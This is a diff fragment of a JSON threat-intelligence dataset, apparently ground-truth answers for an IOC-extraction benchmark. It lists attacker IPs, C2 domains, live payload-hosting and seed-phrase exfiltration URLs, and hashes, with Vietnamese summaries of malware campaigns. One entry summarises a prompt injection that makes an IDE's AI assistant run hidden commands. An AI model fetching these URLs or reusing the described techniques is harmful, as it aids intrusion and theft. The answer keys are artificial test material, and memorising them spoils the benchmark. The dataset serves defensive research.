+        "Lạm dụng luồng xác thực OAuth Device Code hợp pháp: kẻ tấn công lấy mã thiết bị từ Microsoft Entra ID, hiển thị trực tiếp lên trang giả mạo (DocuSign/SharePoint/Adobe) và mở popup tới microsoft.com/devicelogin.",
+        "Khi nạn nhân nhập mã và xác thực 2FA trên trang Microsoft thật, máy chủ của kẻ tấn công trên cụm IP PaaS Railway.com (162.220.234.41, 162.220.234.66, 162.220.232.57, 162.220.232.99, 162.220.232.235) thu hồi access/refresh token dai dẳng ngay cả khi đổi mật khẩu.",
+        "Trang phishing khóa chuột phải, F12, Ctrl+U và kích hoạt vòng lặp debugger vô hạn để chống phân tích."
+      ]
+    },
+    "annotator_notes": "Đã loại microsoft.com (hạ tầng xác thực thật bị lợi dụng trong popup) và domain gốc dùng chung workers.dev; giữ nguyên 5 địa chỉ IP Railway.com thực hiện thu thập token."
+  },
+  {
+    "index": 29,
+    "article_id": "sec-501ae2358020",
+    "title": "An AI gateway designed to steal your data",
+    "source_name": "Kaspersky Securelist",
+    "published_date": "2026-03-26",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [],
+      "domains": [
+        "models.litellm.cloud",
+        "checkmarx.zone"
+      ],
+      "urls": [],
+      "md5": [
+        "85ED77A21B88CAE721F369FA6B7BBBA3",
+        "2E3A4412A7A487B32C5715167C755D08",
+        "0FCCC8E3A03896F45726203074AE225D",
+        "F5560871F6002982A6A2CC0B3EE739F7",
+        "CDE4951BEE7E28AC8A29D33D34A41AE5",
+        "05BACBE163EF0393C2416CBD05E45E74"
+      ],
+      "sha256": [],
+      "cves": [],
+      "attack_behaviors": [
+        "Đầu độc gói PyPI phổ biến litellm==1.82.7 (nhúng vào proxy_server.py) và litellm==1.82.8 (thêm tệp litellm_init.pth tự chạy khi khởi động Python) cùng 2 extension OpenVSX giả của Checkmarx (ast-results 2.53.0, cx-dev-assist 1.7.0 tải checkmarx-util-1.0.4.tgz từ checkmarx.zone/static/).",
+        "Quét đệ quy thu thập SSH keys, tài khoản Git, tệp .env, cấu hình AWS/Kubernetes/Helm/Terraform/CI/DB, ví crypto và webhook Slack/Discord; đóng gói mã hóa AES-256-CBC + RSA thành tpcp.tar.gz gửi về C2.",
+        "Truy vấn dịch vụ AWS IMDS (169.254.169.254) và Amazon ECS metadata (169.254.170.2) để lấy credential tạm thời của IAM role đang chạy.",
+        "Leo thang hạ tầng Kubernetes bằng cách tạo pod đặc quyền (securityContext.privileged=true, gắn hostPath root node) và cài persistence qua systemd tại ~/.config/sysmon/sysmon.py thăm dò C2 checkmarx.zone/raw mỗi 300 giây."
+      ]
+    },
+    "annotator_notes": "Rất quan trọng: Hai địa chỉ 169.254.169.254 và 169.254.170.2 là địa chỉ link-local nội bộ của AWS IMDS/ECS Metadata bị mã độc truy vấn, KHÔNG phải IP C2 của kẻ tấn công nên đã loại khỏi danh sách IPs. Giữ 2 domain models.litellm.cloud và checkmarx.zone theo bảng IOC của Kaspersky."
+  },
+  {
+    "index": 30,
+    "article_id": "thn-3b09dd874e84",
+    "title": "CERT-UA Impersonation Campaign Spread AGEWHEEZE Malware to 1 Million Emails",
+    "source_name": "TheHackerNews",
+    "published_date": "2026-04-01",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [
+        "54.36.237.92"
+      ],
+      "domains": [
+        "cert-ua.tech"
+      ],
+      "urls": [],
+      "md5": [],
+      "sha256": [],
+      "cves": [],
+      "attack_behaviors": [
+        "Giả mạo tổ chức ứng cứu sự cố máy tính Ukraine (CERT-UA) trong một chiến dịch phát tán email lừa đảo quy mô lớn tới 1 triệu hòm thư điện tử.",
+        "Phân phối mã độc mang tên AGEWHEEZE thông qua các tệp đính kèm độc hại nhằm xâm nhập và kiểm soát hệ thống của nạn nhân."
+      ]
+    },
+    "annotator_notes": "Bổ sung IP C2 WebSocket 54.36.237.92 và tên miền giả mạo cert-ua.tech (dùng gửi email incidents@cert-ua.tech và dựng trang giả). Đã loại Files.fm (nền tảng lưu trữ công cộng) và ukr.net (dịch vụ email của nạn nhân)."
+  },
+  {
+    "index": 31,
+    "article_id": "thn-1010bd32f8f0",
+    "title": "APT28 Deploys PRISMEX Malware in Campaign Targeting Ukraine and NATO Allies",
+    "source_name": "TheHackerNews",
+    "published_date": "2026-04-08",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [],
+      "domains": [
+        "wellnesscaremed.com"
+      ],
+      "urls": [],
+      "md5": [],
+      "sha256": [],
+      "cves": [
+        "CVE-2026-21509",
+        "CVE-2026-21513"
+      ],
+      "attack_behaviors": [
+        "Nhóm APT28 (Forest Blizzard / Pawn Storm) thực hiện chiến dịch spear-phishing nhắm vào các cơ quan chính phủ, quốc phòng, khí tượng thủy văn, hậu cần đường sắt/hàng hải của Ukraine và các đồng minh NATO.",
+        "Kết hợp chuỗi khai thác 2 lỗ hổng: dùng CVE-2026-21509 ép hệ thống nạn nhân tải tệp `.LNK` độc hại, sau đó tệp `.LNK` khai thác zero-day CVE-2026-21513 để vượt qua cảnh báo bảo mật và thực thi mã độc.",
+        "Triển khai bộ công cụ mã độc PRISMEX sử dụng kỹ thuật giấu tin trong ảnh (steganography), chiếm quyền điều khiển COM (COM hijacking) và lạm dụng dịch vụ lưu trữ đám mây hợp pháp (`Filen.io`) làm kênh C2:",
+        "+ `PrismexSheet`: Tệp Excel chứa macro VBA trích xuất payload giấu trong file, thiết lập persistence qua COM hijacking và hiển thị tài liệu mồi nhử về danh sách/giá máy bay không người lái (drone).",
+        "+ `PrismexDrop`: Dropper tạo Scheduled Tasks và thực hiện COM DLL hijacking để duy trì truy cập.",
+        "+ `PrismexLoader` (`PixyNetLoader`): Proxy DLL trích xuất payload .NET nằm rải rác trong cấu trúc ảnh PNG (`SplashScreen.png`) bằng thuật toán \"Bit Plane Round Robin\" và chạy trực tiếp trên bộ nhớ (in-memory).",
+        "+ `PrismexStager`: Implant COVENANT Grunt giao tiếp C2 qua dịch vụ đám mây Filen.io (hoặc triển khai công cụ đánh cắp email Outlook là `MiniDoor` / `NotDoor`).",
+        "Trong một sự cố ghi nhận vào tháng 10/2025, payload COVENANT Grunt còn chạy lệnh wiper phá hủy, xóa sạch toàn bộ tệp tin nằm dưới thư mục `%USERPROFILE%`."
+      ]
+    },
+    "annotator_notes": "Tên miền `wellnesscaremed.com` là điểm giao thoa hạ tầng quan trọng liên kết các chiến dịch khai thác cả hai lỗ hổng CVE-2026-21509 và CVE-2026-21513 của APT28. Dịch vụ đám mây `Filen.io` là nền tảng lưu trữ hợp pháp bị PrismexStager lạm dụng làm kênh C2 (Living-off-Trusted-Sites), không phải tên miền độc hại chuyên biệt nên không đưa vào trường Domains C2."
+  },
+  {
+    "index": 32,
+    "article_id": "securelist-f1475328",
+    "title": "The long road to your crypto: ClipBanker and its marathon infection chain",
+    "source_name": "Kaspersky Securelist",
+    "published_date": "2026-04-09",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [],
+      "domains": [],
+      "urls": [
+        "https://maper.info/2X5tF5",
+        "https://pastebin.com/raw/FmpsDAtQ",
+        "https://snippet.host/aaxniv/raw",
+        "https://chiaselinks.com/raw/nkkywvmhux",
+        "https://rlim.com/55Dfq32kaR/raw",
+        "https://paste.kealper.com/raw/k3K5aPJQ",
+        "https://git.parat.swiss/rogers7/dev-api/raw/master/cpzn",
+        "https://pinhole.rootcode.ru/rogers7/dev-api/raw/master/cpzn",
+        "https://github.com/lukecodix/Proxifier/releases/download/4.12/Proxifier.zip",
+        "https://gist.github.com/msfcon5ol3/107484d66423cb601f418344cd648f12/raw/d85cef60cdb9e8d0f3cb3546de6ab657f9498ac7/upxz"
+      ],
+      "md5": [
+        "34a0f70ab100c47caaba7a5c85448e3d",
+        "7528bf597fd7764fcb7ec06512e073e0",
+        "8354223cd6198b05904337b5dff7772b"
+      ],
+      "sha256": [],
+      "cves": [],
+      "attack_behaviors": [
+        "Phát tán trình cài đặt phần mềm Proxifier bị cấy mã độc (trojanized) thông qua kho lưu trữ GitHub giả mạo (`lukecodix/Proxifier`).",
+        "Tạo tệp giả (stub) trong thư mục tạm (`Proxifier<???>.tmp`) làm tiến trình mồi (donor process), tiêm ứng dụng .NET (`api_updater.exe`) vào để chạy PowerShell thông qua lớp `PSObject` (không bật cửa sổ console) nhằm thêm ngoại lệ (exclusion) vào Microsoft Defender cho đuôi `.tmp` và thư mục chứa file chạy.",
+        "Tiêm mô-đun `proxifierupdater.exe` và ứng dụng `bin.exe` vào tiến trình hệ thống `conhost.exe` để thực thi chuỗi 4 hành động:",
+        "1. Thêm tiến trình `powershell` và `conhost` vào danh sách loại trừ của Microsoft Defender.",
+        "2. Tạo khóa Registry `HKLM\\SOFTWARE\\System::Config` để lưu trữ mã lệnh PowerShell mã hóa Base64.",
+        "3. Thiết lập Scheduled Task chạy PowerShell đọc và giải mã nội dung từ khóa Registry trên.",
+        "4. Gửi tín hiệu báo cáo lây nhiễm thành công về dịch vụ IP Logger (`https://maper.info/2X5tF5`).",
+        "Tải script đa tầng từ các dịch vụ Pastebin/Git, giải mã chuỗi Base64 khổng lồ (~500 KB), khởi chạy tiện ích hệ thống `fontdrvhost.exe` và tiêm shellcode vào đó (process injection).",
+        "Payload cuối cùng là mã độc ClipBanker (viết bằng C++), liên tục theo dõi clipboard của nạn nhân và tự động đánh tráo địa chỉ ví của hơn 25 loại tiền điện tử (Bitcoin, Ethereum, Solana, TRON, Monero, Cardano...) sang địa chỉ ví của kẻ tấn công."
+      ]
+    },
+    "annotator_notes": "Việt Nam và Ấn Độ là hai quốc gia có số lượng nạn nhân bị nhiễm chiến dịch ClipBanker này cao nhất theo thống kê của Kaspersky (hơn 2.000 người dùng bị ảnh hưởng từ đầu năm 2025). Đã refang toàn bộ 10 URL phát tán mã độc/payload và trích xuất đầy đủ 3 mã băm MD5 từ mục Indicators of Compromise của bài viết. Các nền tảng như pastebin.com, github.com, gist.github.com là dịch vụ hợp pháp bị lạm dụng để chứa mã độc nên chỉ giữ nguyên dạng URL cụ thể ở mục URLs phát tán mã độc, không trích xuất tên miền gốc vào mục Domains C2."
+  },
+  {
+    "index": 33,
+    "article_id": "thn-e1485d8c5a18",
+    "title": "CPUID Breach Distributes STX RAT via Trojanized CPU-Z and HWMonitor Downloads",
+    "source_name": "TheHackerNews",
+    "published_date": "2026-04-12",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [
+        "95.216.51.236"
+      ],
+      "domains": [
+        "cahayailmukreatif.web.id",
+        "pub-45c2577dbd174292a02137c18e7b1b5a.r2.dev",
+        "transitopalermo.com",
+        "vatrobran.hr"
+      ],
+      "urls": [],
+      "md5": [],
+      "sha256": [],
+      "cves": [],
+      "attack_behaviors": [
+        "Tấn công xâm nhập API phụ (side API) của trang chủ CPUID (`cpuid.com`) trong khoảng thời gian từ 15:00 UTC ngày 09/04 đến 10:00 UTC ngày 10/04/2026 để tráo đổi liên kết tải xuống của các phần mềm giám sát phần cứng phổ biến (CPU-Z, HWMonitor) sang các trang web độc hại.",
+        "Phát tán các tệp nén ZIP và trình cài đặt độc lập chứa file thực thi hợp pháp đã ký số của CPUID đi kèm một tệp DLL độc hại đặt tên là `CRYPTBASE.dll` để thực hiện kỹ thuật DLL side-loading.",
+        "Tệp `CRYPTBASE.dll` thực hiện kiểm tra chống môi trường phân tích ảo (anti-sandbox checks) trước khi kết nối ra máy chủ bên ngoài để tải và chạy payload tiếp theo.",
+        "Triển khai mã độc STX RAT (mẫu sớm nhất ghi nhận tên `superbad.exe` kết nối tới C2 `95.216.51.236`), tích hợp tính năng HVNC (Hidden VNC), đánh cắp thông tin (infostealer), thực thi trực tiếp EXE/DLL/PowerShell/shellcode trong bộ nhớ (in-memory) và thiết lập reverse proxy/tunneling."
+      ]
+    },
+    "annotator_notes": "Tên miền `cpuid.com` là trang web chính thức của nạn nhân bị xâm nhập (watering hole / supply chain compromise), KHÔNG phải tên miền độc hại của kẻ tấn công nên đã loại bỏ. Hạ tầng C2 và chuỗi lây nhiễm của STX RAT trong vụ việc này được tái sử dụng từ chiến dịch giả mạo trình cài đặt FileZilla trước đó. Đã refang toàn bộ IP và 4 tên miền phát tán mã độc."
+  },
+  {
+    "index": 34,
+    "article_id": "sec-7df3676bbea9",
+    "title": "JanelaRAT: a financial threat targeting users in Latin America",
+    "source_name": "Kaspersky Securelist",
+    "published_date": "2026-04-13",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [],
+      "domains": [
+        "ciderurginsx.com"
+      ],
+      "urls": [],
+      "md5": [
+        "808c87015194c51d74356854dfb10d9e",
+        "d7a68749635604d6d7297e4fa2530eb6"
+      ],
+      "sha256": [],
+      "cves": [],
+      "attack_behaviors": [
+        "Phát tán qua email giả mạo hóa đơn chưa thanh toán, dụ nạn nhân bấm vào liên kết tải tệp PDF và chuyển hướng tới trang web tải về tệp nén chứa VBScript, XML, BAT hoặc trình cài đặt MSI.",
+        "Tệp MSI dropper thả ra 2 tệp (tệp thực thi hợp pháp `nevasca.exe` và thư viện độc hại `PixelPaint.dll` - chính là JanelaRAT), đổi tên ngẫu nhiên để làm rối (obfuscate) và tạo lối tắt (`.LNK`) trong thư mục Startup của người dùng để duy trì sự tồn tại (persistence) qua kỹ thuật DLL sideloading.",
+        "Sử dụng công cụ làm rối mã .NET (Eazfuscator, ConfuserEx) với kỹ thuật Control Flow Flattening và mã hóa chuỗi giao tiếp C2 bằng Base64 kết hợp thuật toán Rijndael (AES) với khóa dẫn xuất từ mã băm MD5 của một số có 4 chữ số.",
+        "Gửi truy vấn HTTP beacon theo cấu trúc `<C2Domain>?VS=<malwareversion>&PL=<profilelevel>&AN=<presenceofbankingsoftware>` để báo cáo phiên bản mã độc và kiểm tra sự hiện diện của phần mềm bảo mật ngân hàng trên máy nạn nhân.",
+        "Theo dõi trạng thái không hoạt động của người dùng (user inactivity monitor > 10 phút) và giám sát tiêu đề cửa sổ trình duyệt (active window title) để phát hiện khi nạn nhân truy cập các trang web ngân hàng/tài chính tại khu vực Mỹ Latinh (Brazil, Mexico).",
+        "Thực hiện chiếm quyền phiên giao dịch ngân hàng trực tiếp (live banking session hijacking), chụp ảnh màn hình, hiển thị lớp phủ giả mạo toàn màn hình (overlay windows), ghi thao tác phím (keylogging) và điều khiển chuột/bàn phím từ xa."
+      ]
+    },
+    "annotator_notes": "JanelaRAT (biến thể nâng cấp từ BX RAT) nhắm vào người dùng ngân hàng tại Brazil và Mexico với hơn 26.400 vụ phát hiện năm 2025. Dùng thuật toán xoay domain C2 theo ngày kết hợp DDNS trên cổng 443 (không dùng TLS), chống phân tích qua Magnifier/MagnifierWindow và hiển thị màn hình cập nhật Windows giả mạo."
+  },
+  {
+    "index": 35,
+    "article_id": "securelist-d281ec59",
+    "title": "FakeWallet crypto stealer spreading through iOS apps in the App Store",
+    "source_name": "Kaspersky Securelist",
+    "published_date": "2026-04-20",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [
+        "139.180.139.209"
+      ],
+      "domains": [
+        "www.gxzhrc.cn",
+        "appstoreios.com",
+        "crypto-stroe.cc",
+        "yjzhengruol.com",
+        "6688cf.jhxrpbgq.com",
+        "xz.apps-store.im",
+        "ntm0mdkzymy3n.oukwww.com",
+        "nziwytu5n.lahuafa.com",
+        "zdrhnmjjndu.ulbcl.com",
+        "mti4ywy4.lahuafa.com",
+        "mtjln.siyangoil.com",
+        "odm0.siyangoil.com",
+        "mgi1y.siyangoil.com",
+        "mziyytm5ytk.ahroar.com",
+        "ngy2yjq0otlj.ahroar.com",
+        "kkkhhhnnn.com",
+        "helllo2025.com",
+        "sxsfcc.com",
+        "iosfc.com",
+        "nmu8n.com",
+        "zmx6f.com",
+        "api.dc1637.xyz"
+      ],
+      "urls": [
+        "https://www.gxzhrc.cn/download/",
+        "https://appstoreios.com/DjZH?key=646556306F6Q465O313L737N3332939Y353I830F31",
+        "https://crypto-stroe.cc/",
+        "https://yjzhengruol.com/s/3f605f",
+        "https://6688cf.jhxrpbgq.com/6axqkwuq",
+        "https://139.180.139.209/prod-api/system/confData/getUserConfByKey/",
+        "https://xz.apps-store.im/s/iuXt?key=646Y563Y6F6H465J313X737U333S9342323N030R34&c=",
+        "https://xz.apps-store.im/DjZH?key=646B563L6F6N4657313B737U3436335E3833331737",
+        "https://xz.apps-store.im/s/dDan?key=646756376F6A465D313L737J333993473233038L39&c=",
+        "https://xz.apps-store.im/CqDq?key=646R563V6F6Y465K313J737G343C3352383R336O35",
+        "https://ntm0mdkzymy3n.oukwww.com/7nhn7jvv5YieDe7P?0e7b9c78e=686989d97cf0d70346cbde2031207cbf",
+        "https://ntm0mdkzymy3n.oukwww.com/jFms03nKTf7RIZN8?61f68b07f8=0565364633b5acdd24a498a6a9ab4eca",
+        "https://nziwytu5n.lahuafa.com/10RsW/mw2ZmvXKUEbzI0n",
+        "https://zdrhnmjjndu.ulbcl.com/7uchSEp6DIEAqux?a3f65e=417ae7f384c49de8c672aec86d5a2860",
+        "https://zdrhnmjjndu.ulbcl.com/tWe0ASmXJbDz3KGh?4a1bbe6d=31d25ddf2697b9e13ee883fff328b22f",
+        "https://api.npoint.io/153b165a59f8f7d7b097",
+        "https://mti4ywy4.lahuafa.com/UVB2U/mw2ZmvXKUEbzI0n",
+        "https://mtjln.siyangoil.com/08dT284P/1ZMz5Xmb0EoQZVvS5",
+        "https://odm0.siyangoil.com/TYTmtV8t/JG6T5nvM1AYqAcN",
+        "https://mgi1y.siyangoil.com/vmzLvi4Dh/1Dd0m4BmAuhVVCbzF",
+        "https://mziyytm5ytk.ahroar.com/kAN2pIEaariFb8Yc",
+        "https://ngy2yjq0otlj.ahroar.com/EpCXMKDMx1roYGJ",
+        "https://ngy2yjq0otlj.ahroar.com/17pIWJfr9DBiXYrSb",
+        "https://kkkhhhnnn.com/api/open/postByTokenpocket",
+        "https://helllo2025.com/api/open/postByTokenpocket",
+        "https://sxsfcc.com/api/open/postByTokenpocket",
+        "https://iosfc.com/ledger/ios/Rsakeycatch.php",
+        "https://nmu8n.com/tpocket/ios/Rsakeyword.php",
+        "https://zmx6f.com/btp/ios/receiRsakeyword.php",
+        "https://api.dc1637.xyz"
+      ],
+      "md5": [
+        "4126348d783393dd85ede3468e48405d",
+        "b639f7f81a8faca9c62fd227fef5e28c",
+        "d48b580718b0e1617afc1dec028e9059",
+        "bafba3d044a4f674fc9edc67ef6b8a6b",
+        "79fe383f0963ae741193989c12aefacc",
+        "8d45a67b648d2cb46292ff5041a5dd44",
+        "7e678ca2f01dc853e85d13924e6c8a45",
+        "be9e0d516f59ae57f5553bcc3cf296d1",
+        "fd0dc5d4bba740c7b4cc78c4b19a5840",
+        "7b4c61ff418f6fe80cf8adb474278311",
+        "8cbd34393d1d54a90be3c2b53d8fc17a",
+        "d138a63436b4dd8c5a55d184e025ef99",
+        "5bdae6cb778d002c806bb7ed130985f3",
+        "84c81a5e49291fe60eb9f5c1e2ac184b",
+        "19733e0dfa804e3676f97eff90f2e467",
+        "8f51f82393c6467f9392fb9eb46f9301",
+        "114721fbc23ff9d188535bd736a0d30e"
+      ],
+      "sha256": [],
+      "cves": [],
+      "attack_behaviors": [
+        "Cài cắm framework độc hại vào các ứng dụng giả mạo ví tiền điện tử (TokenPocket, MetaMask, Ledger Live, imToken, Trust Wallet...) phát tán qua App Store và các trang tải ngoài appstoreios.com, crypto-stroe.cc, apps-store.im.",
+        "Gửi cụm từ khôi phục ví (mnemonic/seed phrase) và khóa riêng tư của nạn nhân về các endpoint C2 như /api/open/postByTokenpocket, /ledger/ios/Rsakeycatch.php, /tpocket/ios/Rsakeyword.php.",
+        "Sử dụng dịch vụ JSON paste hợp pháp api.npoint.io làm dead-drop cấu hình động trỏ tới chuỗi tên miền phát tán đa tầng."
+      ]
+    },
+    "annotator_notes": "Đã lọc chính xác 17 mã MD5 tệp IPA/dylib/HTML/APK ở phần File Hashes (loại 4 chuỗi hex dài 32 ký tự nằm trong query parameter của URL như ?0e7b9c78e=...), loại chuỗi giữ chỗ hxxps://xxx[.]com và tách api.npoint.io ra khỏi danh sách Domains chặn (chỉ giữ URL đầy đủ https://api.npoint.io/153b165a59f8f7d7b097)."
+  },
+  {
+    "index": 36,
+    "article_id": "thn-9afa9ad61dd4",
+    "title": "Google Patches Antigravity IDE Flaw Enabling Prompt Injection Code Execution",
+    "source_name": "TheHackerNews",
+    "published_date": "2026-04-21",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [],
+      "domains": [],
+      "urls": [],
+      "md5": [],
+      "sha256": [],
+      "cves": [
+        "CVE-2026-21520"
+      ],
+      "attack_behaviors": [
+        "Google phát hành bản vá lỗi bảo mật trong môi trường phát triển Antigravity IDE, khắc phục lỗ hổng cho phép kẻ tấn công thực thi mã thông qua kỹ thuật tiêm câu lệnh nhắc (Prompt Injection).",
+        "Lợi dụng điểm yếu trong cách xử lý đầu vào của trợ lý AI tích hợp trong IDE để ép hệ thống chạy các lệnh ngầm nguy hiểm khi lập trình viên mở dự án hoặc tệp mã nguồn độc hại."
+      ]
+    },
+    "annotator_notes": "Lỗ hổng find_by_name (-X exec-batch) trên Antigravity IDE trong bài báo không có mã CVE riêng; bổ sung CVE-2026-21520 (ShareLeak trên Microsoft Copilot Studio) được liệt kê trong phần tổng hợp cuối bài. Đã loại claude.ai và claude.com (nền tảng hợp pháp bị lạm dụng trong PoC Claudy Day)."
+  },
+  {
+    "index": 37,
+    "article_id": "dfir-689ef7f4",
+    "title": "Bissa Scanner Exposed: AI-Assisted Mass Exploitation and Credential Harvesting",
+    "source_name": "The DFIR Report",
+    "published_date": "2026-04-22",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [],
+      "domains": [
+        "denemekulubum.com.tr",
+        "wiprz.com"
+      ],
+      "urls": [],
+      "md5": [],
+      "sha256": [],
+      "cves": [
+        "CVE-2025-55182",
+        "CVE-2025-9501"
+      ],
+      "attack_behaviors": [
+        "Vận hành công cụ quét tự động quy mô lớn Bissa Scanner tích hợp quy trình điều phối bằng AI (Claude Code và OpenClaw) quét hàng triệu mục tiêu lỗ hổng React2Shell (CVE-2025-55182) và WordPress W3 Total Cache (CVE-2025-9501), xác nhận hơn 900 vụ xâm nhập thành công.",
+        "Lấy tệp mục tiêu (acquirer) lưu trữ tại denemekulubum.com.tr/acquirer/ và wiprz.com/acquirer/ kết hợp feed từ cs2.ip.thc.org.",
+        "Thu hoạch hàng loạt tệp .env (chứa API key AI Anthropic/OpenAI/DeepSeek, AWS/Azure/GCP, Stripe, Plaid, MongoDB, Supabase...), tự động đóng gói ZIP và đẩy lên dịch vụ S3 Filebase (https://s3.filebase.com, bucket bissapromax).",
+        "Gửi thông báo chiến lợi phẩm trực tiếp về Telegram C2 qua bot @bissapwned_bot và @bissa_scan_bot tới tài khoản vận hành @BonJoviGoesHard."
+      ]
+    },
+    "annotator_notes": "Đã loại s3.filebase.com (dịch vụ lưu trữ S3 dùng chung, bucket bissapromax) và cs2.ip.thc.org (dịch vụ feed quét mạng công cộng bị lợi dụng); chỉ giữ 2 tên miền phát tán acquirer riêng của kẻ tấn công và 2 CVE được Bissa nhắm khai thác."
+  },
+  {
+    "index": 38,
+    "article_id": "thn-56404cecf750",
+    "title": "Malicious KICS Docker Images and VS Code Extensions Hit Checkmarx Supply Chain",
+    "source_name": "TheHackerNews",
+    "published_date": "2026-04-22",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [
+        "94.154.172.43",
+        "91.195.240.123"
+      ],
+      "domains": [
+        "audit.checkmarx.cx",
+        "checkmarx.cx"
+      ],
+      "urls": [],
+      "md5": [],
+      "sha256": [],
+      "cves": [],
+      "attack_behaviors": [
+        "Tấn công chuỗi cung ứng nhắm vào Checkmarx thông qua việc phát tán các hình ảnh Docker KICS (Keeping Infrastructure as Code Secure) giả mạo/độc hại và các tiện ích mở rộng VS Code bị cấy mã độc.",
+        "Tiêm mã độc vào các công cụ bảo mật cơ sở hạ tầng dạng mã (IaC) nhằm xâm nhập môi trường làm việc của nhà phát triển."
+      ]
+    },
+    "annotator_notes": "Bổ sung 2 tên miền C2 typosquat (audit.checkmarx.cx, checkmarx.cx) và 2 IP tương ứng (94.154.172.43, 91.195.240.123) từ cảnh báo của Checkmarx/Socket. Đường dẫn endpoint không scheme trong bài là audit.checkmarx.cx/v1/telemetry."
+  },
+  {
+    "index": 39,
+    "article_id": "thn-c6c6339dccbd",
+    "title": "LMDeploy CVE-2026-33626 Flaw Exploited Within 13 Hours of Disclosure",
+    "source_name": "TheHackerNews",
+    "published_date": "2026-04-24",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [
+        "103.116.72.119"
+      ],
+      "domains": [],
+      "urls": [],
+      "md5": [],
+      "sha256": [],
+      "cves": [
+        "CVE-2026-33626",
+        "CVE-2026-0740",
+        "CVE-2026-3844"
+      ],
+      "attack_behaviors": [
+        "Lỗ hổng bảo mật trong LMDeploy mang mã CVE-2026-33626 đã bị kẻ tấn công chủ động khai thác thực tế (in-the-wild) chỉ trong vòng 13 giờ kể từ khi thông tin chi tiết được công bố.",
+        "Tin tặc nhanh chóng lợi dụng điểm yếu trong khung phục vụ mô hình ngôn ngữ lớn để thực hiện các hành vi xâm nhập trái phép trước khi các quản trị viên kịp áp dụng bản vá."
+      ]
+    },
+    "annotator_notes": "Bổ sung IP nguồn khai thác LMDeploy SSRF từ honeypot Sysdig (103.116.72.119) cùng 2 CVE plugin WordPress đang bị khai thác (CVE-2026-0740, CVE-2026-3844). Đã loại 127.0.0.1 (mục tiêu quét nội bộ SSRF) và requestrepo.com (dịch vụ test OOB DNS công cộng)."
+  },
+  {
+    "index": 40,
+    "article_id": "thn-57a84dfe10da",
+    "title": "Mirai-Based xlabs_v1 Botnet Exploits ADB to Hijack IoT Devices for DDoS Attacks",
+    "source_name": "TheHackerNews",
+    "published_date": "2026-05-06",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [
+        "176.65.139.44",
+        "176.65.139.42",
+        "103.177.110.202"
+      ],
+      "domains": [
+        "xlabslover.lol"
+      ],
+      "urls": [],
+      "md5": [],
+      "sha256": [],
+      "cves": [],
+      "attack_behaviors": [
+        "Tìm kiếm các thiết bị Android (Android TV box, smart TV, set-top box) mở cổng Android Debug Bridge (ADB TCP/5555) để thực thi lệnh dán payload vào /data/local/tmp (kèm tệp boot.apk và binary đa kiến trúc ARM/MIPS/x86-64/ARC) từ IP máy chủ tại Hà Lan 176.65.139.44.",
+        "Nhận lệnh tấn công từ bảng điều khiển DDoS-for-hire xlabslover.lol hỗ trợ 21 kiểu flood TCP/UDP/raw (RakNet, OpenVPN UDP) nhắm vào máy chủ game và Minecraft.",
+        "Thực hiện đo băng thông đường truyền (mở 8.192 socket TCP tới máy chủ Speedtest trong 10 giây) để phân hạng gói thuê cho khách hàng và tiêu diệt botnet đối thủ.",
+        "Trên hạ tầng lân cận 176.65.139.42 phát hiện bộ công cụ đào Monero VLTRig; ngoài ra một chiến dịch khác nhắm Jenkins dùng IP 103.177.110.202 phát tán botnet DDoS."
+      ]
+    },
+    "annotator_notes": "Ghi nhận đầy đủ 3 địa chỉ IP hạ tầng phát tán/đồng định vị (176.65.139.44, 176.65.139.42, 103.177.110.202) và tên miền bảng điều khiển C2 xlabslover.lol."
+  },
+  {
+    "index": 41,
+    "article_id": "thn-ecb3982310df",
+    "title": "MuddyWater Uses Microsoft Teams to Steal Credentials in False Flag Ransomware Attack",
+    "source_name": "TheHackerNews",
+    "published_date": "2026-05-06",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [
+        "172.86.126.208",
+        "172.86.76.127"
+      ],
+      "domains": [],
+      "urls": [],
+      "md5": [],
+      "sha256": [],
+      "cves": [],
+      "attack_behaviors": [
+        "Nhóm tin tặc MuddyWater lạm dụng ứng dụng Microsoft Teams để đánh cắp thông tin xác thực trong một chiến dịch tấn công giả mạo cờ (False Flag Ransomware Attack).",
+        "Sử dụng các thông điệp qua chat giả danh để lừa người dùng cung cấp thông tin đăng nhập, ngụy trang dưới vỏ bọc của một cuộc tấn công mã độc tống tiền nhằm che giấu mục đích gián điệp thực sự."
+      ]
+    },
+    "annotator_notes": "Bổ sung 2 IP hạ tầng tấn công: 172.86.126.208 (máy chủ phát tán ms_upd.exe) và 172.86.76.127 (VPS RouterHosting chứa bộ công cụ/C2/dữ liệu đánh cắp). Đã loại mjla.gov.om vì đây là tên miền cơ quan nạn nhân (Bộ Tư pháp Oman)."
+  },
+  {
+    "index": 42,
+    "article_id": "thn-cb24025d9fcf",
+    "title": "cPanel, WHM Release Fixes for Three New Vulnerabilities — Patch Now",
+    "source_name": "TheHackerNews",
+    "published_date": "2026-05-09",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [],
+      "domains": [],
+      "urls": [],
+      "md5": [],
+      "sha256": [],
+      "cves": [
+        "CVE-2026-29201",
+        "CVE-2026-29202",
+        "CVE-2026-29203",
+        "CVE-2026-41940"
+      ],
+      "attack_behaviors": [
+        "cPanel và WHM vá 3 lỗ hổng mới: CVE-2026-29201 (đọc tệp tùy ý qua adminbin feature::LOADFEATUREFILE), CVE-2026-29202 (thực thi mã Perl tùy ý qua tham số plugin của create_user API) và CVE-2026-29203 (xử lý symlink không an toàn cho phép sửa quyền chmod dẫn tới DoS/leo quyền).",
+        "Cảnh báo song hành với lỗ hổng zero-day nghiêm trọng CVE-2026-41940 trước đó ít ngày đang bị tin tặc khai thác ngoài thực tế để phát tán biến thể botnet Mirai và mã độc tống tiền Sorry."
+      ]
+    },
